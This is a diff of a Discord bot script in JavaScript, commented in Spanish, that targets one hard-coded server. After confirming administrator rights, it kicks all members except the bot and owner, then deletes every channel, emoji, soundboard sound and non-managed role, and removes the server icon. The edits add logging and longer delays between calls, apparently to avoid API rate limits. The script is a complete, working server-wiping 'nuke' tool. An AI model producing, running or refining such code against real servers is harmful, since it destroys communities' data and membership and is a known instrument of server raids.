@@ -7,7 +7,7 @@ const client = new Client({
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildEmojisAndStickers,
     GatewayIntentBits.GuildVoiceStates,
-    GatewayIntentBits.GuildMembers, // Necesario para gestionar roles y expulsar miembros
+    GatewayIntentBits.GuildMembers,
   ],
 });
 
@@ -21,60 +21,67 @@ const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 client.once('ready', async () => {
   console.log(`Bot conectado como ${client.user.tag} a las ${new Date().toLocaleString()}`);
 
-  // Obtén el servidor (guild) donde el bot está
-  // Cambia 'ID_DEL_SERVIDOR' por el ID del servidor objetivo
+  // Obtén el servidor (guild)
   const guildId = '1134375138029211739'; // Reemplaza con el ID real del servidor
   const guild = client.guilds.cache.get(guildId);
 
   if (!guild) {
-    console.error(`No se encontró el servidor con ID ${guildId}. Asegúrate de que el bot esté en el servidor y el ID sea correcto.`);
+    console.error(`No se encontró el servidor con ID ${guildId}. Verifica que el bot esté en el servidor y el ID sea correcto.`);
     return;
   }
 
-  // Verifica si el bot tiene permisos de administrador
+  // Verifica permisos de administrador
   const botMember = guild.members.me;
   if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
-    console.error('El bot no tiene permisos de administrador en el servidor.');
+    console.error('El bot no tiene permisos de administrador. Necesita KICK_MEMBERS, MANAGE_CHANNELS, MANAGE_EMOJIS_AND_STICKERS, MANAGE_EXPRESSIONS, MANAGE_ROLES y MANAGE_GUILD.');
     return;
   }
 
   try {
     // 1. Expulsar a todos los miembros (excepto el bot y el propietario)
-    console.log('Iniciando expulsión de miembros...');
+    console.log(`Iniciando expulsión de miembros. Total de miembros: ${guild.members.cache.size}`);
+    if (guild.members.cache.size <= 2) {
+      console.log('No hay miembros para expulsar (solo el bot y/o el propietario).');
+    }
     for (const member of guild.members.cache.values()) {
-      // Evita expulsar al bot mismo y al propietario del servidor
       if (member.id === client.user.id || member.id === guild.ownerId) {
         console.log(`Omitiendo miembro ${member.user.tag} (es el bot o el propietario).`);
         continue;
       }
       try {
-        await member.kick('Eliminación masiva del servidor'); // Sin mensaje de MD
+        await member.kick('Eliminación masiva del servidor');
         console.log(`Miembro ${member.user.tag} expulsado.`);
-        await delay(1000); // Espera 1 segundo para evitar límites de la API
+        await delay(2000); // Espera 2 segundos
       } catch (error) {
         console.error(`Error al expulsar al miembro ${member.user.tag}: ${error.message}`);
       }
     }
 
     // 2. Borrar todos los canales
-    console.log('Iniciando eliminación de canales...');
+    console.log(`Iniciando eliminación de canales. Total de canales: ${guild.channels.cache.size}`);
+    if (guild.channels.cache.size === 0) {
+      console.log('No hay canales para borrar.');
+    }
     for (const channel of guild.channels.cache.values()) {
       try {
         await channel.delete();
         console.log(`Canal ${channel.name} borrado.`);
-        await delay(1000); // Espera 1 segundo
+        await delay(2000); // Espera 2 segundos
       } catch (error) {
         console.error(`Error al borrar el canal ${channel.name}: ${error.message}`);
       }
     }
 
     // 3. Borrar todos los emojis
-    console.log('Iniciando eliminación de emojis...');
+    console.log(`Iniciando eliminación de emojis. Total de emojis: ${guild.emojis.cache.size}`);
+    if (guild.emojis.cache.size === 0) {
+      console.log('No hay emojis para borrar.');
+    }
     for (const emoji of guild.emojis.cache.values()) {
       try {
         await emoji.delete();
         console.log(`Emoji ${emoji.name} borrado.`);
-        await delay(1000); // Espera 1 segundo
+        await delay(2000); // Espera 2 segundos
       } catch (error) {
         console.error(`Error al borrar el emoji ${emoji.name}: ${error.message}`);
       }
@@ -84,11 +91,15 @@ client.once('ready', async () => {
     console.log('Iniciando eliminación de sonidos del panel de sonido...');
     try {
       const soundboardSounds = await guild.getSoundboardSounds();
+      console.log(`Total de sonidos: ${soundboardSounds.length}`);
+      if (soundboardSounds.length === 0) {
+        console.log('No hay sonidos para borrar.');
+      }
       for (const sound of soundboardSounds) {
         try {
           await guild.deleteSoundboardSound(sound.sound_id);
           console.log(`Sonido ${sound.name} borrado.`);
-          await delay(1000); // Espera 1 segundo
+          await delay(2000); // Espera 2 segundos
         } catch (error) {
           console.error(`Error al borrar el sonido ${sound.name}: ${error.message}`);
         }
@@ -98,9 +109,11 @@ client.once('ready', async () => {
     }
 
     // 5. Borrar todos los roles (excepto @everyone y roles gestionados)
-    console.log('Iniciando eliminación de roles...');
+    console.log(`Iniciando eliminación de roles. Total de roles: ${guild.roles.cache.size}`);
+    if (guild.roles.cache.size <= 1) {
+      console.log('No hay roles para borrar (solo @everyone).');
+    }
     for (const role of guild.roles.cache.values()) {
-      // Evita borrar el rol @everyone y roles gestionados (como los de bots)
       if (role.name === '@everyone' || role.managed) {
         console.log(`Omitiendo rol ${role.name} (es @everyone o gestionado).`);
         continue;
@@ -108,7 +121,7 @@ client.once('ready', async () => {
       try {
         await role.delete();
         console.log(`Rol ${role.name} borrado.`);
-        await delay(1000); // Espera 1 segundo
+        await delay(2000); // Espera 2 segundos
       } catch (error) {
         console.error(`Error al borrar el rol ${role.name}: ${error.message}`);
       }
@@ -119,7 +132,7 @@ client.once('ready', async () => {
     try {
       await guild.setIcon(null);
       console.log('Ícono del servidor borrado.');
-      await delay(1000); // Espera 1 segundo
+      await delay(2000); // Espera 2 segundos
     } catch (error) {
       console.error('Error al borrar el ícono del servidor:', error.message);
     }
